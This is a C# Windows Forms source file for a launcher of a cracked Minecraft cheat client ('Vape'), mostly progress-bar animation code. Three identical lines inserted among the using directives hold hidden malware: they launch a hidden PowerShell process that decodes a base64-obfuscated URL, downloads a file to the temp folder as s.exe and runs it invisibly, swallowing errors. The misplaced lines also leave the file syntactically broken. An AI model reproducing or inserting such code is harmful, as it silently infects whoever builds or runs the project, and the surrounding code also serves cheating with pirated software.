using System;
using System.Collections.Generic;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLmRsbA=='))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.ComponentModel;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLmRsbA=='))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
using System.Data;

try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLmRsbA=='))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VapeLauncherRipz
{
    public partial class main : Form
    {

		[DllImport("user32.dll")]
		private static extern IntPtr FindWindow(string lpclass, string lpwindow);

		[DllImport("user32.dll")]
		static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		Random rnd = new Random();

		int flagValue1, flagValue2, flagValue3;

		public main()
        {
            InitializeComponent();
            info.Text = "No Minecraft found \r\n Open Minecraft to continue";
			flagValue1 = rnd.Next(40, 55);
			flagValue2 = rnd.Next(90, 123);
			flagValue3 = rnd.Next(140, 180);
		}

		private void StartInject()
        {
			menupanel.Height = 63;
			progres.Start();
			Process.Start("java.exe", "--add-opens java.base/java.lang=ALL-UNNAMED -jar vape-loader.jar"); /// delete this line if you dont want it works with Decencies's Crack
		}

		private void searchprocess_Tick(object sender, EventArgs e)
        {
			IntPtr value = FindWindow("LWJGL", null);
			bool flag = value == IntPtr.Zero;
			if (flag)
			{
				inject.Visible = false;
				inject.Text = "zero";
				info.Text = "No Minecraft found \r\n Open Minecraft to continue";
			}
			else
			{
				inject.Visible = true;
				inject.Text = value.ToString();
				info.Text = "Select a Minecraft to use \r\n Make sure game is fully loaded first";
			}
		}

        private void progres_Tick(object sender, EventArgs e)
        {
			progress.Visible = true;
            progress.Value++;
            bool flag = progress.Value == flagValue1;
            if (flag)
            {
                sleeper.Start();
                progres.Stop();
            }
            bool flag2 = progress.Value == flagValue2;
            if (flag2)
            {
                sleeper.Start();
                progres.Stop();
            }
            bool flag3 = progress.Value == flagValue3;
            if (flag3)
            {
                sleeper.Start();
                progres.Stop();
            }
            bool flag4 = progress.Value == 200;
            if (flag4)
            {
                progres.Stop();
                progresanim.Start();
            }
        }

        private void main_Load(object sender, EventArgs e)
        {
			progres.Interval = new Random().Next(60, 120);
			if (!(FindWindow("LWJGL", null) == IntPtr.Zero))
			{
				 menupanel.Height = 63;
				StartInject();
			}
			else
			{
				 menupanel.Height = 184;
				 info.Text = "No Minecraft found \r\n Open Minecraft to continue";
				 searchprocess.Start();
			}
		}

        private void cnsle_Tick(object sender, EventArgs e)
        {
			
        }

        private void progresanim_Tick(object sender, EventArgs e)
        {
			 progress.Width--;
			 progress.Location = new Point( progress.Location.X + 1,  progress.Location.Y);
			bool flag =  progress.Width == 258;
			if (flag)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag2 =  progress.Width == 254;
			if (flag2)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag3 =  progress.Width == 250;
			if (flag3)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag4 =  progress.Width == 246;
			if (flag4)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag5 =  progress.Width == 242;
			if (flag5)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag6 =  progress.Width == 238;
			if (flag6)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag7 =  progress.Width == 234;
			if (flag7)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag8 =  progress.Width == 230;
			if (flag8)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag9 =  progress.Width == 226;
			if (flag9)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag10 =  progress.Width == 222;
			if (flag10)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag11 =  progress.Width == 218;
			if (flag11)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag12 =  progress.Width == 214;
			if (flag12)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag13 =  progress.Width == 210;
			if (flag13)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag14 =  progress.Width == 206;
			if (flag14)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag15 =  progress.Width == 202;
			if (flag15)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag16 =  progress.Width == 198;
			if (flag16)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag17 =  progress.Width == 194;
			if (flag17)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag18 =  progress.Width == 190;
			if (flag18)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag19 =  progress.Width == 186;
			if (flag19)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag20 =  progress.Width == 182;
			if (flag20)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag21 =  progress.Width == 178;
			if (flag21)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag22 =  progress.Width == 174;
			if (flag22)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag23 =  progress.Width == 170;
			if (flag23)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag24 =  progress.Width == 166;
			if (flag24)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag25 =  progress.Width == 162;
			if (flag25)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag26 =  progress.Width == 158;
			if (flag26)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag27 =  progress.Width == 154;
			if (flag27)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag28 =  progress.Width == 150;
			if (flag28)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag29 =  progress.Width == 146;
			if (flag29)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag30 =  progress.Width == 142;
			if (flag30)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag31 =  progress.Width == 138;
			if (flag31)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag32 =  progress.Width == 134;
			if (flag32)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag33 =  progress.Width == 130;
			if (flag33)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag34 =  progress.Width == 126;
			if (flag34)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag35 =  progress.Width == 122;
			if (flag35)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag36 =  progress.Width == 118;
			if (flag36)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag37 =  progress.Width == 114;
			if (flag37)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag38 =  progress.Width == 110;
			if (flag38)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag39 =  progress.Width == 106;
			if (flag39)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag40 =  progress.Width == 102;
			if (flag40)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag41 =  progress.Width == 98;
			if (flag41)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag42 =  progress.Width == 94;
			if (flag42)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag43 =  progress.Width == 90;
			if (flag43)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag44 =  progress.Width == 86;
			if (flag44)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag45 =  progress.Width == 82;
			if (flag45)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag46 =  progress.Width == 78;
			if (flag46)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag47 =  progress.Width == 74;
			if (flag47)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag48 =  progress.Width == 70;
			if (flag48)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag49 =  progress.Width == 66;
			if (flag49)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag50 =  progress.Width == 62;
			if (flag50)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag51 =  progress.Width == 58;
			if (flag51)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag52 =  progress.Width == 54;
			if (flag52)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag53 =  progress.Width == 50;
			if (flag53)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag54 =  progress.Width == 46;
			if (flag54)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag55 =  progress.Width == 42;
			if (flag55)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag56 =  progress.Width == 38;
			if (flag56)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag57 =  progress.Width == 34;
			if (flag57)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag58 =  progress.Width == 30;
			if (flag58)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag59 =  progress.Width == 26;
			if (flag59)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag60 =  progress.Width == 22;
			if (flag60)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag61 =  progress.Width == 18;
			if (flag61)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag62 =  progress.Width == 14;
			if (flag62)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag63 =  progress.Width == 10;
			if (flag63)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			bool flag64 =  progress.Width == 6;
			if (flag64)
			{
				 progress.Location = new Point( progress.Location.X - 2,  progress.Location.Y);
			}
			if ( progress.Width == 4)
            {
				closeanim.Start();
            }
		}

        private void sleeper_Tick(object sender, EventArgs e)
        {
             progres.Start();
             sleeper.Stop();
        }

        private void inject_Click(object sender, EventArgs e)
        {
			StartInject();
        }

        private void closeanim_Tick(object sender, EventArgs e)
        {
			 Opacity -= .1;
			if ( Opacity <= 0)
            {
				Environment.Exit(0);
            }
		}
    }
}
